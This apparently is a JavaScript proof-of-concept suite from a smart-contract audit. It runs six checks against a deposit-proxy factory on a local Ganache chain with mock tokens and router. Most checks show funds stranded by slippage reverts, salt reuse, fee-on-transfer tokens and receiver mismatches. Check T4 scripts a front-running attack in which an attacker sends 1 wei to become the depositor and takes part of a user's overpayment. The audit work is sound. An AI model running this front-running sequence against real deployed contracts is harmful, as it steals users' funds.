const { ethers } = require('ethers');
const ganache = require('ganache');
const A = require('./artifacts.json');

const res = [];
function check(name, cond, detail = '') {
  res.push({ name, pass: !!cond, detail });
  console.log(`${cond ? 'PASS' : 'FAIL'}  ${name}${detail ? '  —  ' + detail : ''}`);
}
const c = (f, n) => A[f][n];

(async () => {
  const provider = new ethers.BrowserProvider(ganache.provider({ logging: { quiet: true }, chain: { chainId: 31337 } }));
  const s = [];
  for (let i = 0; i < 6; i++) s.push(await provider.getSigner(i));
  const [owner, user, attacker, dest, user2] = s;

  const dep = (abi, bin, signer) => new ethers.ContractFactory(abi, bin, signer).deploy();

  const logic = await new ethers.ContractFactory(c('DepositProxy.sol','DepositProxy').abi, c('DepositProxy.sol','DepositProxy').evm.bytecode.object, owner).deploy();
  const fac   = await new ethers.ContractFactory(c('DepositProxyFactory.sol','DepositProxyFactory').abi, c('DepositProxyFactory.sol','DepositProxyFactory').evm.bytecode.object, owner).deploy(await logic.getAddress());
  const tokA  = await new ethers.ContractFactory(c('Mocks.sol','MockERC20').abi, c('Mocks.sol','MockERC20').evm.bytecode.object, owner).deploy('A', 0);
  const tokB  = await new ethers.ContractFactory(c('Mocks.sol','MockERC20').abi, c('Mocks.sol','MockERC20').evm.bytecode.object, owner).deploy('B', 0);
  const tokF  = await new ethers.ContractFactory(c('Mocks.sol','MockERC20').abi, c('Mocks.sol','MockERC20').evm.bytecode.object, owner).deploy('FOT', 1000);
  const router= await new ethers.ContractFactory(c('Mocks.sol','MockRouter').abi, c('Mocks.sol','MockRouter').evm.bytecode.object, owner).deploy();
  await fac.setRouterAllowed(await router.getAddress(), true);
  const F = await fac.getAddress(), R = await router.getAddress();
  const a = await tokA.getAddress(), b = await tokB.getAddress(), f = await tokF.getAddress();

  await (await tokB.mint(R, 10n**24n)).wait();
  const saltOf = async (id, d, ft, tt) => await fac.saltFor(id, d, ft, tt);
  const routerData = (pull, give) => router.interface.encodeFunctionData('swap', [a, pull, b, give]);

  // ---------------------------------------------------------------- T1: role gate
  const salt1 = await saltOf('DP-000001', dest.address, a, b);
  await (await fac.connect(owner).createProxy(salt1, a, b, dest.address, 5n * 10n**18n)).wait();
  const p1 = await fac.computeAddress(salt1);
  await (await tokA.mint(p1, 10n * 10n**18n)).wait();

  let r = await Promise.allSettled([ (async () => { await (await new ethers.Contract(p1, ['function execute(address,bytes,bytes32)'], attacker).execute(R, routerData(10n*10n**18n, 5n*10n**18n), salt1)).wait(); })() ]);
  check('T1 attacker cannot call execute', r[0].status === 'rejected', String(r[0].reason?.shortMessage ?? ''));

  r = await Promise.allSettled([ (async () => { await (await new ethers.Contract(p1, ['function initialize(address,address,address,uint256,address)'], attacker).initialize(a,b,attacker.address,0,attacker.address)).wait(); })() ]);
  check('T1 attacker cannot re-initialize proxy (take over factory)', r[0].status === 'rejected', String(r[0].reason?.shortMessage ?? ''));

  r = await Promise.allSettled([ (async () => { await (await new ethers.Contract(p1, ['function onFunded(address,uint256)'], attacker).onFunded(attacker.address, 1)).wait(); })() ]);
  check('T1 attacker cannot forge onFunded (depositor slot)', r[0].status === 'rejected', String(r[0].reason?.shortMessage ?? ''));

  // ---------------------------------------------------------------- T2: slippage revert leaves funds, no refund
  const proxyAbi = ['function execute(address,bytes,bytes32)', 'function executed() view returns (bool)'];
  const P1 = new ethers.Contract(p1, proxyAbi, owner);
  r = await Promise.allSettled([ (async () => { await (await P1.execute(R, routerData(10n*10n**18n, 4n*10n**18n), salt1)).wait(); })() ]);
  const balAfterFail = await tokA.balanceOf(p1);
  check('T2 execute reverts when outDelta < minOut', r[0].status === 'rejected', String(r[0].reason?.shortMessage ?? '').slice(0,60));
  check('T2 input untouched after the revert', balAfterFail === 10n*10n**18n, `balance=${ethers.formatEther(balAfterFail)} A`);
  check('T2 executed flag still false (retry possible on-chain)', (await P1.executed()) === false);

  // retry with good numbers -> succeeds, so the only reason funds are lost is the server giving up
  const before = await tokB.balanceOf(dest.address);
  await (await P1.execute(R, routerData(10n*10n**18n, 5n*10n**18n), salt1)).wait();
  const outB = await tokB.balanceOf(dest.address);
  check('T2 relayer retry does work (loss is purely the server abandoning the order)', outB - before === 5n*10n**18n, `dest +${ethers.formatEther(outB-before)} B`);

  // ---------------------------------------------------------------- T3: same salt funded twice -> permanent lock
  const balBefore = await tokA.balanceOf(p1);
  await (await tokA.mint(p1, 3n * 10n**18n)).wait();     // a second order collides on depositId+salt
  r = await Promise.allSettled([ (async () => { await (await P1.execute(R, routerData(3n*10n**18n, 1n*10n**18n), salt1)).wait(); })() ]);
  check('T3 second execute on an already-executed proxy reverts', r[0].status === 'rejected', String(r[0].reason?.shortMessage ?? '').slice(0,60));
  r = await Promise.allSettled([ (async () => { await (await fac.connect(owner).createProxy(salt1, a, b, dest.address, 1n)).wait(); })() ]);
  check('T3 createProxy for that salt reverts (cannot redeploy)', r[0].status === 'rejected', String(r[0].reason?.shortMessage ?? '').slice(0,60));
  const stuck = await tokA.balanceOf(p1);
  check('T3 funds are unrecoverable by anyone', stuck === balBefore + 3n*10n**18n, `stuck=${ethers.formatEther(stuck)} A`);

  // ---------------------------------------------------------------- T4: depositor squat -> overpayment dust to attacker
  const salt2 = await saltOf('DP-000002', dest.address, a, b);
  await (await fac.connect(owner).createProxy(salt2, a, b, dest.address, 2n*10n**18n)).wait();
  const p2 = await fac.computeAddress(salt2);
  await (await tokA.mint(p2, 10n*10n**18n)).wait();                 // user overpaid: quote was 8, sent 10
  await (await attacker.sendTransaction({ to: p2, value: 1n })).wait(); // front-run execute, 1 wei
  const P2 = new ethers.Contract(p2, proxyAbi, owner);
  await (await P2.execute(R, routerData(8n*10n**18n, 2n*10n**18n), salt2)).wait();
  const atkB = await tokA.balanceOf(attacker.address);
  check('T4 attacker becomes depositor with 1 wei', atkB === 2n*10n**18n, `attacker got ${ethers.formatEther(atkB)} A of the user's overpayment`);

  // ---------------------------------------------------------------- T5: fee-on-transfer deposit can never satisfy `expected`
  const salt3 = await saltOf('DP-000003', dest.address, f, b);
  await (await fac.connect(owner).createProxy(salt3, f, b, dest.address, 0n)).wait();
  const p3 = await fac.computeAddress(salt3);
  await (await tokF.mint(user.address, 100n*10n**18n)).wait();
  await (await tokF.connect(user).transfer(p3, 100n*10n**18n)).wait();
  const got = await tokF.balanceOf(p3);
  check('T5 fee-on-transfer deposit arrives short of `sendAmount`', got === 90n*10n**18n, `watcher expects 100, sees ${ethers.formatEther(got)} -> never executes`);

  // ---------------------------------------------------------------- T6: planner sets dstReceiver = destination, proxy expects the output
  const salt4 = await saltOf('DP-000004', dest.address, a, b);
  await (await fac.connect(owner).createProxy(salt4, a, b, dest.address, 5n*10n**18n)).wait();
  const p4 = await fac.computeAddress(salt4);
  await (await tokA.mint(p4, 10n*10n**18n)).wait();
  const P4 = new ethers.Contract(p4, proxyAbi, owner);
  const dataToDest = router.interface.encodeFunctionData('swapTo', [a, 10n*10n**18n, b, 5n*10n**18n, dest.address]);
  const destB0 = await tokB.balanceOf(dest.address);
  r = await Promise.allSettled([ (async () => { await (await P4.execute(R, dataToDest, salt4)).wait(); })() ]);
  check('T6 execute reverts when calldata pays `destination` instead of the proxy', r[0].status === 'rejected', String(r[0].reason?.shortMessage ?? '').slice(0,60));
  check('T6 user output was never received (swap undone by the revert)', (await tokB.balanceOf(dest.address)) === destB0);
  check('T6 deposit stranded in the proxy', (await tokA.balanceOf(p4)) === 10n*10n**18n, `${ethers.formatEther(await tokA.balanceOf(p4))} A stranded, executed=${await P4.executed()}`);

  const fails = res.filter(x => !x.pass).length;
  console.log(`\n${res.length - fails}/${res.length} passed`);
  require('fs').writeFileSync('/home/user/ee.io/audit/ee-io-deposit-v3/poc-results.json', JSON.stringify(res, null, 2));
  process.exit(fails ? 1 : 0);
})().catch(e => { console.error('FATAL', e.shortMessage ?? e); process.exit(2); });
